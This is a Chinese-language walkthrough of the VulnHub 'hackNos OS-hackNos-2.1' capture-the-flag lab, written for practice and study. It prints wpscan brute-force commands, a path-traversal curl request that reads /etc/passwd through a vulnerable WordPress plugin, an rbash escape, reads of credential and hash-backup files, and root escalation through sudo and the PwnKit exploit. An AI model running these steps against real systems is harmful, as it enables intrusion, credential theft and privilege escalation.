# HACKNOS: OS-HACKNOS-2.1

2025.02.17 https://www.vulnhub.com/entry/hacknos-os-hacknos-21,403/

[video]()

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

gobuster 扫描出一个 http://192.168.5.40/tsweb/ 打开后是一个 wordpress，在页面底部发现一个邮箱，可能存在的系统用户名为 rahulgehlaut ，尝试用 wpscan 进行枚举：

```
wpscan --url http://192.168.5.40/tsweb/ -e u,ap,at --plugins-detection mixed
```

发现了一个用户名 user，尝试登陆页面爆破：

```
wpscan --url http://192.168.5.40/tsweb/ -U user -P ~/tools/dict/passwd_1050.txt -t 32
```

无结果。

在看看 wp 的插件是否有可以利用的漏洞，发现插件 akismet、classic-editor、gracemedia-media-player 其中 gracemedia-media-player 有文件包含漏洞：

```
curl http://192.168.5.40/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash
flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash
```

尝试对 flag 用户的哈希进行破解，得到密码: topsecret

尝试 ssh 登陆并且绕过 rbash:

```
ssh flag@192.168.5.40 -t "bash --noprofile"
```

进入/var/www/html 文件夹找到 wp 的数据库配置文件：

```
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', 'hackNos-2.com' );
define( 'DB_HOST', 'localhost' );
```

尝试用数据库的密码切换到 rohit 用户，切换失败。

通过枚举，发现另外一个 hash 备份文件：

```
flag@hacknos:/$ cat /var/backups/passbkp/md5-hash
$1$rohit$01Dl0NQKtgfeL08fGrggi0
```

尝试解密哈希得到密码为: !%hack41 使用此密码切换到 rohit。

先获得了 user flag:

```
rohit@hacknos:~$ cat user.txt
############################################
 __    __   _______   ______    ______
/  |  /  | /       | /      \  /      \
$$ |  $$ |/$$$$$$$/ /$$$$$$  |/$$$$$$  |
$$ |  $$ |$$      \ $$    $$ |$$ |
$$ \__$$ | $$$$$$  |$$$$$$$$/ $$ |
$$    $$/ /     $$/ $$       |$$ |
 $$$$$$/  $$$$$$$/   $$$$$$$/ $$/



############################################

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
```

sudo -l 发现 ALL，直接提权到 root:

```
rohit@hacknos:~$ sudo su
root@hacknos:/home/rohit# cd /root
root@hacknos:~# ls
root.txt
root@hacknos:~# cat root.txt
 _______                         __              __  __     #
/       \                       /  |            /  |/  |    #
$$$$$$$  |  ______    ______   _$$ |_          _$$ |$$ |_   #
$$ |__$$ | /      \  /      \ / $$   |        / $$  $$   |  #
$$    $$< /$$$$$$  |/$$$$$$  |$$$$$$/         $$$$$$$$$$/   #
$$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | __       / $$  $$   |  #
$$ |  $$ |$$ \__$$ |$$ \__$$ |  $$ |/  |      $$$$$$$$$$/   #
$$ |  $$ |$$    $$/ $$    $$/   $$  $$/         $$ |$$ |    #
$$/   $$/  $$$$$$/   $$$$$$/     $$$$/          $$/ $$/     #
#############################################################

#############################################################
MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Blog : www.hackNos.com

Author : Rahul Gehlaut

linkedin : https://www.linkedin.com/in/rahulgehlaut/
#############################################################
```

第二种提权路径：发现 CVE-2021-4034 PwnKit ，直接上传 pwnkit 同样也可以提权到 root：

```
flag@hacknos:/tmp$ ./pwnkit
root@hacknos:/tmp# cd /root
root@hacknos:~# ls -al
```
